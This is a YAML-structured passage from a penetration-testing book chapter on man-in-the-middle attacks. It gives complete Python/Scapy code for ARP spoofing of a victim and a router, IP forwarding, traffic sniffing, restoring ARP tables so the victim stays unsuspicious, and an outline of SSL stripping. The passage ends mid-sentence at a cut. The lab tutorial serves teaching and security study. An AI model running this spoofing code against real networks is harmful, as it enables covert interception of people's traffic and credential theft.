@@ -1,0 +1,1042 @@
+- en: '*Chapter 5*: Man in the Middle Attacks'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'In the previous chapter, we learned about network scanning. Network scanning
+    is a part of information gathering that allows users to find hosts in a local
+    network. In this chapter, we will learn how to utilize this information to attacks
+    victims on the local network. We will cover the following topics in this chapter:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Why do we need ARP?
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Building an ARP spoof program
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Monitoring traffic
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Encrypted traffic
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Restoring ARP tables manually
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Decrypting the network traffic
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Why do we need ARP?
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In the previous chapters, we mentioned what an address resolution protocol is.
+    In this chapter, we will look at it in more depth. In the local network, communication
+    takes place between devices using MAC addresses instead of IP addresses. These
+    are also called *link layer addresses*. ARP is a request response protocol, which
+    means that one device requests a service and the other one replies in response
+    to that request. Suppose that two devices are present in a network with no external
+    internet connectivity. For them to communicate with each other, they need to rely
+    on a underlying protocol, which is known as the layer 2 protocol. We've already
+    briefly learned about ARP tables. By using an ARP table, a device can maintain
+    a list of all active devices on the network by using a mapping of their IP and
+    MAC addresses. This ARP table technique is quite old and was designed without
+    security considerations in mind. It has some inherent weaknesses that can be exploited,
+    as we will see in later sections.
+  prefs: []
+  type: TYPE_NORMAL
+- en: ARP poisoning
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Before we learn about ARP poisoning, let''s look at the ARP again. ARP is basically
+    a program that''s installed on your PC that performs all tasks related to ARP
+    automatically, without needing any input from the user. To get an address from
+    a machine, it puts **FF:FF:FF:FF:FF:FF** as a broadcast address in its request.
+    It does this to send the request to all the active devices in the network while
+    asking the relevant question. Subsequently, the intended device replies with the
+    appropriate answer. Let''s take a look at the following diagram to see how ARP
+    requests and responses are generated:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.1 – ARP requests and responses'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_01.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.1 – ARP requests and responses
+  prefs: []
+  type: TYPE_NORMAL
+- en: Device **A** sends a request and device **B** replies with an answer, along
+    with its MAC address. Looks pretty straightforward, right? Actually, there is
+    a design flaw in this protocol. When device **B** receives a request, it has no
+    way of knowing whether the information being provided by the requesting device
+    is correct or not. In this way, you can easily *spoof* the packets. More on this
+    in a moment.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s consider a simple scenario:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.2 – Internet communication'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_02.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.2 – Internet communication
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s say device **A** wants to communicate with an internet-based device.
+    As we already know, it can''t directly connect to the internet by itself – it
+    must go through a gateway. The corresponding IP and MAC address of the device
+    are shown in the following image. Device **A** and the gateway maintain their
+    own ARP tables. For device **A** to send a request to the external server, it
+    will look inside its own ARP table to find the MAC address of the gateway device.
+    Once it successfully finds the device''s MAC address, it will send the request
+    to the gateway. This is represented by **step 1** in the preceding diagram. If
+    there is only one device in the local network, the ARP table in device **A** will
+    look something like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.3 – ARP table in device A'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_03.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.3 – ARP table in device A
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, since the gateway is a bridge between a local network and the internet,
+    I will figure out the external IP address for the packet. Then, using its own
+    external or public IP address, it will forward the request to the server located
+    at **77.88.99.11**. This is **step 2**. The server will process the request and
+    reply to the router in **step 3**. The router will receive this reply and figure
+    out where the external packet should go to. How does it figure out where the packet
+    should go? As you may have guessed, it will look at the destination address and
+    destination port. Using its own ARP table, it will see where the respective device
+    is located. The ARP table in the router will look like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.4 – ARP table in the router'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_04.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.4 – ARP table in the router
+  prefs: []
+  type: TYPE_NORMAL
+- en: In **step 4**, the router will simply forward the reply to the intended recipient.
+  prefs: []
+  type: TYPE_NORMAL
+- en: So far, we've learned how a normal request response works. Now, we will add
+    an additional player called the *hacker/pentester*.
+  prefs: []
+  type: TYPE_NORMAL
+- en: ARP works in the following way. As we already know, devices keep connecting
+    and disconnecting to a network all the time, so the ARP program doesn't keep this
+    ARP table indefinitely. Another reason for this is that the **dynamic host control
+    protocol** (**DHCP**) server automatically assigns IP addresses to devices in
+    a network. So, when a device goes offline, the IP address becomes available again
+    so that it can be assigned to new connected devices. For this reason, devices
+    in a network periodically send *ARP responses* to other devices in a network to
+    let them know of their current IP and MAC addresses. This ensures that all the
+    devices have an updated record of the IP and MAC addresses. Now, when a device
+    receives an *ARP response*, it just updates its ARP table without any authentication
+    or validation. You can see the problem here, right? If a device creates an ARP
+    response with fake information and sends it over to a victim/target machine, the
+    receiving device will update its ARP table with fake information, without validating
+    the correctness of the data. Another weakness in the ARP protocol is that it allows
+    us to accept responses, even if it didn't send a request.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s take a look at what happens when we add a malicious actor to a network:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.5 – Attacker added to the network'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_05.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.5 – Attacker added to the network
+  prefs: []
+  type: TYPE_NORMAL
+- en: Here, device **B**, which belongs to the hacker, will generate two fake *ARP
+    responses* – one for the victim and one for the gateway router. It will send an
+    **arp** reply to device **A** and pretend to be a router. Similarly, it will send
+    a reply to the router and pretend to be device **A**. Now, both device **A** and
+    the router will update their ARP tables with this new *fake* information. Now,
+    if device **A** makes the same request as it did in the previous case to the external
+    server, instead of the request going to the router, the request will go to the
+    attacker. The attacker can then choose to forward the request to the router. At
+    this point, the router will think the request is coming from device **A** while
+    in reality, the request is coming from device **B**. Device **B** is, in fact,
+    intercepting all the network traffic between the router and device **A**. Remember
+    the CIA triad, which we learned about previously? Can you figure out which rule
+    is being violated here? All three rules can be broken here, depending on what
+    the hacker intends to do with the information here. Now, the hacker is effectively
+    the *man in the middle* between the router and device **A**. This is why it is
+    called a **man in the middle** (**MITM**) attack. This vulnerability is very well
+    known and is called ARP poisoning.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Important Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: The ARP table gets reset after a certain period of time, so just sending one
+    packet to spoof is not going to work properly. To be able to successfully spoof
+    for longer periods, you need to constantly send these fake manufactured packets
+    so that ARP tables don't get reset after a certain time.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Building an ARP spoof program
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'In this section, we will learn how to build an ARP spoof program. Before we
+    move on, let''s take a look at the ARP tables again in both Kali as well as the
+    Windows. The ARP table in Kali Linux is as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.6 – ARP table in Kali Linux'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_06.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.6 – ARP table in Kali Linux
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The ARP table in Windows looks like this. Take a look at the highlighted fields:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.7 – ARP table in Windows 10'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/Image86812.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.7 – ARP table in Windows 10
+  prefs: []
+  type: TYPE_NORMAL
+- en: As you can see, they have the correct MAC addresses for the router located at
+    **192.168.74.2**. Kali is located at **192.168.74.128**, while Windows 10 is located
+    at **192.168.74.129**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To spoof these devices, we will take on this problem step by step. First, we
+    will tackle spoofing the victim machine with the MAC address of the router.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Arp spoof project
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Open VS Code in Kali Linux and create a new project named ARP spoof. Install
+    the virtual environment, as shown in [*Chapter 2*](B14788_02_Final_JC_ePub.xhtml#_idTextAnchor054),
+    *Getting Started – Setting Up A Lab Environment*. Once the virtual environment
+    has been installed, enable the virtual environment by writing the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: source venv/bin/activate
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will activate the new virtual environment. Install the **Scapy** module
+    inside this environment and create a new file named **main.py**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To import all the **scapy** modules in one line without having to explicitly
+    import everything separately, you can write the following line:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: from scapy.all import *
+  prefs: []
+  type: TYPE_NORMAL
+- en: '***** means that we want to import all the modules present in **scapy**. As
+    we learned in the previous section, to spoof, we have to create fake responses.
+    First, we will create a response intended for the victim. To do this, we will
+    create an **arp** packet and see what fields can be set in it. To create an ARP
+    packet and to see which fields are present, we can write the following code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(arp_response.show())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The output of this code looks like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.8 – ARP packet fields'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/Image86820.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.8 – ARP packet fields
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The fields that we are interested in start from **op** onward. Op stands for
+    operation or type of packet. This is a **who has** operation, which means that
+    it is an ARP request. But we are interested in creating an ARP response instead.
+    **hwsrc** is the MAC address of the Kali machine and similarly, **psrc** is its
+    IP address. **hwdst** and **pdst** haven''t been set for this packet yet. Now,
+    we will make the following modifications in this packet in order to spoof the
+    victim:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Change **op** to **2**, implying that this is a response ARP packet, not a request.
+    Note that by default, this value is 1, which means it corresponds to the **who-has**
+    operation.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Change the **psrc** address field to make it equal to the value of the IP address
+    of the router. Since our router is located at **192.168.72.2**, we will set this
+    field to this value.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Lastly, we will set **pdst** to the **ip** address of the victim machine, which
+    is **192.168.74.129**. We will also set the **hwdst** address, which is the victim's
+    MAC address.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'To see the MAC address of the Windows machine, you can write the following
+    command in the Command Prompt or use the network scanner we created in the previous
+    chapter:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Ipconfig /all
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once you have the necessary information, proceed to Python to make the following
+    changes:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.129" // windows IP
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"     // windows mac
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"     // kali mac
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.2"   // fake field value
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Only the last field is crafted; we will be sending it from **192.168.74.128**
+    while pretending to be at **192.168.74.2**. Once all the fields have been set,
+    you can print them to see if they have been defined correctly:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(arp_response.show())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following screenshot shows the spoofed packet according to the code we
+    wrote previously:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.9 – Spoofed ARP packet'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_09.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.9 – Spoofed ARP packet
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here, you can see that the **op** field is now a response instead of request.
+    The field value is now **is-at**. Similarly, the **psrc** field is pretending
+    to be the IP of the router instead of Kali. Note that we haven''t sent the packet
+    yet. To send this packet, we can simply use the **send** function:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, if you run this program and quickly go to the Windows machine before the
+    **arp** table gets reset, you will see that the **arp** table of the Windows machine
+    has been poisoned and that its **arp** table entry shows the wrong MAC address
+    for the **192.168.72.2** gateway. Instead of pointing to the actual gateway, it
+    now points to Kali''s MAC address:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.10 – Poisoned ARP table in Windows'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_10.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.10 – Poisoned ARP table in Windows
+  prefs: []
+  type: TYPE_NORMAL
+- en: Compare this with *Figure 5.6* for the value of **192.168.74.2**. Here, you
+    can see that the value of the physical address in this new table has been modified.
+    Note that if you take too long to view this value, it will be reset automatically.
+    We will learn how to stop it from being reset automatically for a longer poisoning
+    period in a moment.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, let''s create a function so that we can call it easily:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'def spoof_victim():'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.129"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.2"
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We will create a similar function to spoof the router as well:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'def spoof_router():'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.2" // router's IP
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:50:56:ff:74:8b" // router's mac
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0c:29:90:79:02" // kali's mac
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.129" // fake pretending to be device A.
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this function, we have changed the values of **pdst**, **hwdst**, and **psrc**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The complete program is as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: from scapy.all import *
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'def spoof_victim():'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.129"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.2"
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'def spoof_router():'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.2"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:50:56:ff:74:8b"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.129"
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_victim()
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_router()
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note that this will only spoof these devices once. To create a permanent spoofing,
+    we can add these function calls to a loop and continuously send these packets
+    after a certain delay. This way, the **arp** tables will not get a chance to reset
+    and you will be able to permanently spoof these devices, as long as your spoof
+    program is running.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also try to put an exit condition in a loop. We will use **KeyboardInterrupt**
+    to exit. Use the following code to send packets continuously after a delay of
+    every 2 seconds:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'try:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_victim()
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_router()
+  prefs: []
+  type: TYPE_NORMAL
+- en: time.sleep(2)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'except KeyboardInterrupt as err:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("exiting")
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Note that you will need to import the time module at the top of file. Although
+    our spoofing program looks complete, there is a slight problem – if the victim
+    now tries to request an internet server, they will see an internet connectivity
+    issue. Run the **arp** spoof program on Linux and go to the Windows machine and
+    try to access a website. You will see a window similar to the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.11 – No connection'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_11.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.11 – No connection
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This is because the packets are going to the Kali machine but it is blocking
+    packets from being forwarded. To enable packet forwarding, run the following command
+    on your Linux Terminal:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sysctl -w net.ipv4.ip_forward=1
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will enable IP forwarding on the Kali machine. Now, the Windows user will
+    be able to access the internet without even noticing that someone is intercepting
+    their traffic:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.12 – Enabling IPv4 forwarding'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_12.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.12 – Enabling IPv4 forwarding
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, if you go to the Windows machine and try to access a website again, you
+    should have internet connectivity. Now, your spoof program should be working perfectly.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Monitoring traffic
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'To see what the user is doing, you can open *Wireshark* on Kali and select
+    the **eth0** interface to see all the traffic going over the network. To see only
+    the traffic originating from the Windows machine, you can set a filter in the
+    filter menu. Use the following filter:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: ip.src == 192.168.74.129
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will only display the traffic that originates from the Windows machine.
+    Now, if you were to go to the Windows machine and access a website, you should
+    see the packet arriving in Wireshark:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.13 – Wireshark traffic from a Windows machine'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_13.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.13 – Wireshark traffic from a Windows machine
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this section, we learned how to poison an ARP table and monitor the network
+    traffic between the victim device and the internet. In the next section, we will
+    learn how this network traffic is encrypted and how this encryption can be broken.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Encrypted traffic
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In the early days of the internet, internet traffic was mostly text-based, so
+    everyone sniffing over the network could see exactly what was being sent over
+    it. This was extremely unsecure and people could not send sensitive information
+    such as passwords over the network. Since then, the internet has come a long way.
+    Now, most internet traffic, except for some really old websites, is secure and
+    uses encryption. This means that even if you can see the traffic, you will not
+    be able to read it since it is encrypted. If you see the **https** tag on a website's
+    URL, this means that the network traffic is encrypted and can't be read over the
+    wire. There are tools that can be used to decrypt this traffic.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Restoring ARP tables manually
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'Now that we have seen how to successfully spoof packets, when we close our
+    program by using a keyboard interrupt, such as *Ctrl* + *C*, we will see that
+    the internet becomes unavailable again on our Windows machine. This is because
+    the ARP tables have been poisoned and we haven''t restored them, so they don''t
+    know where to route the network traffic. This will automatically reset itself
+    after a couple of minutes. However, this can raise suspicion for the victim, and
+    they might realize that someone is tampering with their network traffic. To avoid
+    this, we can restore these tables by sending over correct information when we
+    exit the program. We can use the following program to restore the correct values:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'def restore():'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '# restoring router table'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.2"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:50:56:ff:74:8b"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:0C:29:BE:47:14"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.129"
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: '#restoring windows table'
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response = ARP()
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.op = 2
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.pdst = "192.168.74.129"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.hwsrc = "00:50:56:ff:74:8b"
+  prefs: []
+  type: TYPE_NORMAL
+- en: arp_response.psrc = "192.168.74.2"
+  prefs: []
+  type: TYPE_NORMAL
+- en: send(arp_response)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Note that these values are for my platform; they will be different for your
+    platform, so you should change these values accordingly. To restore the ARP table,
+    send these values to the router from our Linux machine while pretending to be
+    device A. This time, instead of entering fake information, enter the correct values.
+    Do the same for the Windows machine. Finally, call this function when a keyboard
+    interrupt occurs, as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'try:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_victim()
+  prefs: []
+  type: TYPE_NORMAL
+- en: spoof_router()
+  prefs: []
+  type: TYPE_NORMAL
+- en: time.sleep(2)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'except KeyboardInterrupt as err:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("restoring ARP tables")
+  prefs: []
+  type: TYPE_NORMAL
+- en: restore()
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("exiting")
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this section, we learned how to poison an ARP table, monitor the network
+    traffic, and restore the ARP tables in the victim machines to make sure they're
+    not suspicious of our activity. Next, we will learn how to decrypt this network
+    traffic.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Decrypting the network traffic
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: As we saw in the previous section, we can intercept traffic using a man in the
+    middle attack. However, this attack is rarely useful on its own since all the
+    browser traffic nowadays is encrypted, so even if you were able to intercept traffic,
+    you won't be able to do much. You can bypass this procedure by using SSL stripping.
+    Intercepting traffic without encryption is also sometimes useful when you want
+    to monitor a user's activity. This can help you figure out which websites a user
+    is visiting the most. Using this information alongside social engineering attacks
+    can help you compromise the victim's machine.
+  prefs: []
+  type: TYPE_NORMAL
+- en: HTTPS versus HTTP
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: To understand how SSL stripping works, we need to understand how the **hypertext
+    transfer protocol** (**HTTP**) and HTTPS protocols work. HTTPS is a *secure* version
+    of HTTP, as indicated by the *S* at the end of its name. It was developed in the
+    early days of the internet, when information was sent in the form of human readable
+    text and anyone intercepting or monitoring the traffic could potentially see what
+    was going on.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'A typical **HTTP** request would look something like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.14 – HTTP request'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_14.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.14 – HTTP request
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As you can see, the body of the HTTP request is in the form of plain text,
+    which means it can be read easily. So, if you were to send your email or password
+    in plain text to the server, the hacker could potentially steal your credentials.
+    You already know how dangerous this can be. To avoid this problem, HTTPS was developed,
+    which could encrypt the body of the message so that only the server and requestor
+    can read it with the proper encryption keys – no middle man can read it. Once
+    the server receives the request, it will respond with the appropriate reply. The
+    server''s reply would look like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.15 – HTTP reply'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_15.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.15 – HTTP reply
+  prefs: []
+  type: TYPE_NORMAL
+- en: The last line represents the body of the reply, which is the web page that the
+    user requested. In the case of HTTPS, the *body* of these requests and responses
+    would be encrypted and appear as gibberish to the attacker. Now, let's focus on
+    how we can bypass this.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Bypassing HTTPS
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Although the majority of websites nowadays support HTTPS instead of HTTP, on
+    the server side, in order to maintain backward compatibility, the server still
+    allows requests to come from *HTTP* and once they receive them, they will check
+    whether the client/requestor supports HTTPS or not. We can take advantage of this
+    to bypass this security mechanism. The following diagram shows how HTTP requests
+    work with a web server:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.16 – HTTP cycle'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_16.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.16 – HTTP cycle
+  prefs: []
+  type: TYPE_NORMAL
+- en: When the client first accesses a website, it is usually over HTTP protocol,
+    so it sends an unsecure request to initiate a connection. The server receives
+    this request and asks the client whether it supports HTTPS or not. If the client
+    supports HTTPS, the server will say, *Why don't you talk with me over HTTPS?*.
+    The client then switches to *HTTPS*. Once this happens, all the communication
+    is encrypted.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This is where we will introduce our middle man *attacker*. We will do so in
+    a way to fool both the server and the client. Let''s take a look at the following
+    diagram:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 5.17 – MITM attack with SSL stripping'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_05_17.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 5.17 – MITM attack with SSL stripping
+  prefs: []
+  type: TYPE_NORMAL
+- en: During the first phase, the client will make an HTTP request to the server.
+    The attacker is sitting between the client and the server and is using the **arp**
+    spoofing program to monitor the traffic that we developed in the previous chapter.
+    They will take this request from the client, convert it into an HTTPS request,
+    and forward it to the server. The server will think that the client is talking
+    over HTTPS instead of HTTP. Similarly, the attacker will take replies from the
+    server, decrypt them, and read what is happening. Once they've done that, they
+    will forward them to the victim/client. In this way, the victim will think that
+    the server is talking over HTTP, while the server will think that the client is
+    talking over HTTPS. Meanwhile, the attacker is reading all the network traffic.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The job of the attacker is to encrypt and decrypt the SSL certificates that
+    are used by servers for authenticating security on the transport layer. They form
+    the basis of secure communication. Learning how to perform SSL stripping is outside
+    the scope of this book as it requires extensive knowledge of networking, which
+    could be a book on its own. Our goal here is to compromise the system using this
+    tool. We will use a famous SSL stripping tool called **bettercap** to do so. We
+    will use version 2.23\. Note that the latest tools for this component don't seem
